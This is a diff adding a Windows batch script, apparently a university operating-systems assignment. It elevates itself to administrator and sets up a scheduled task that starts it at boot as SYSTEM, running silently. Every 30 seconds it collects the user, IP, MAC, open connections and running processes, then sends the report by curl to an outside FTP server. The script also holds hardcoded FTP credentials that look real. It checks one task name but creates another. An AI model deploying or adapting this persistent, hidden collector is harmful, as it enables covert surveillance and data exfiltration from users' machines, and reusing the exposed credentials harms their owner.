@@ -1,0 +1,104 @@
+@echo off
+chcp 65001 >nul
+setlocal enabledelayedexpansion
+title Sistema - @Juliocrm
+
+:: ======================================================================
+:: --- VERIFICACION DE ADMIN Y AUTO-ELEVACION ---
+:: ======================================================================
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: ======================================================================
+:: --- PERSISTENCIA MEDIANTE PROGRAMADOR DE TAREAS (BACKGROUND) ---
+:: ======================================================================
+:: Crea una tarea programada que ejecuta este archivo exactamente donde está guardado.
+:: Al ejecutarse como "NT AUTHORITY\SYSTEM", el script corre de forma nativa en segundo plano sin ventana de CMD.
+schtasks /query /tn "Tarea_Gr03_Rios" >nul 2>&1
+if %errorLevel% neq 0 (
+    schtasks /create /tn "Tarea_Gr03_GutierrezJ" /tr "\"%~f0\"" /sc onstart /ru "NT AUTHORITY\SYSTEM" /f >nul 2>&1
+)
+
+:: ======================================================================
+:: --- CONFIGURACION DE RUTAS Y REPORTE ---
+:: ======================================================================
+if not exist "C:\parcial" (
+    mkdir "C:\parcial" >nul 2>&1
+)
+
+set "DESTINO_RED=\\192.168.5.72\parcial"
+set "ARCHIVO_LOCAL=C:\parcial\Gr03_Rios.txt"
+
+set "USUARIO=!USERNAME!"
+set "MAQUINA=!COMPUTERNAME!"
+
+:: Configuración de la URL Dinámica del Servidor FTP
+set "FTP_SERVER=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_!MAQUINA!/Gr03_Rios.txt"
+set "FTP_USER=u917850771"
+set "FTP_PASS=Unicesar2026+"
+
+for /f "tokens=*" %%V in ('ver') do set "WIN_VER=%%V"
+
+:BUCLE
+set "FECHA=!date!"
+set "HORA=!time!"
+
+REM == Obtener Direccion IP IPv4 ==
+set "IP="
+for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do (
+    if not defined IP set "IP=%%I"
+)
+if defined IP set "IP=!IP:~1!"
+
+REM == Obtener Direccion MAC ==
+set "MAC="
+for /f "tokens=1" %%M in ('getmac ^| findstr /r "..-..-..-..-..-.."') do (
+    if not defined MAC set "MAC=%%M"
+)
+
+:: ======================================================================
+:: --- GENERACION DEL ARCHIVO INFORMATIVO TXT ---
+:: ======================================================================
+echo ============================================================ > "!ARCHIVO_LOCAL!"
+echo    INFORMACION DEL SISTEMA  ^| >> "!ARCHIVO_LOCAL!"
+echo ============================================================ >> "!ARCHIVO_LOCAL!"
+echo. >> "!ARCHIVO_LOCAL!"
+echo  Version de Windows : !WIN_VER! >> "!ARCHIVO_LOCAL!"
+echo  Fecha              : !FECHA! >> "!ARCHIVO_LOCAL!"
+echo  Hora               : !HORA! >> "!ARCHIVO_LOCAL!"
+echo  Usuario            : !USUARIO! >> "!ARCHIVO_LOCAL!"
+echo  Direccion IP       : !IP! >> "!ARCHIVO_LOCAL!"
+echo  Direccion MAC      : !MAC! >> "!ARCHIVO_LOCAL!"
+echo  Nombre Maquina     : !MAQUINA! >> "!ARCHIVO_LOCAL!"
+echo. >> "!ARCHIVO_LOCAL!"
+echo ============================================================ >> "!ARCHIVO_LOCAL!"
+echo  TODOS LOS PUERTOS LOCALES Y CONEXIONES (netstat -ano) >> "!ARCHIVO_LOCAL!"
+echo ============================================================ >> "!ARCHIVO_LOCAL!"
+echo. >> "!ARCHIVO_LOCAL!"
+netstat -ano >> "!ARCHIVO_LOCAL!"
+echo. >> "!ARCHIVO_LOCAL!"
+echo ============================================================ >> "!ARCHIVO_LOCAL!"
+echo  LISTA DE PROCESOS ACTIVOS (tasklist) >> "!ARCHIVO_LOCAL!"
+echo ============================================================ >> "!ARCHIVO_LOCAL!"
+echo. >> "!ARCHIVO_LOCAL!"
+tasklist >> "!ARCHIVO_LOCAL!"
+echo. >> "!ARCHIVO_LOCAL!"
+echo ============================================================ >> "!ARCHIVO_LOCAL!"
+echo  @Juliocrm >> "!ARCHIVO_LOCAL!"
+echo ============================================================ >> "!ARCHIVO_LOCAL!"
+
+REM == Transferencia de Archivos a la Carpeta de Red ==
+copy /Y "!ARCHIVO_LOCAL!" "!DESTINO_RED!\Gr03_Rios.txt" >nul 2>&1
+
+:: ======================================================================
+:: --- ENVÍO DE DATOS MEDIANTE CURL AL SERVIDOR FTP ---
+:: ======================================================================
+curl --ftp-create-dirs -u "!FTP_USER!:!FTP_PASS!" -T "!ARCHIVO_LOCAL!" "!FTP_SERVER!" >nul 2>&1
+
+:: Temporizador silencioso de 30 segundos
+timeout /t 30 /nobreak >nul
+
+goto BUCLE
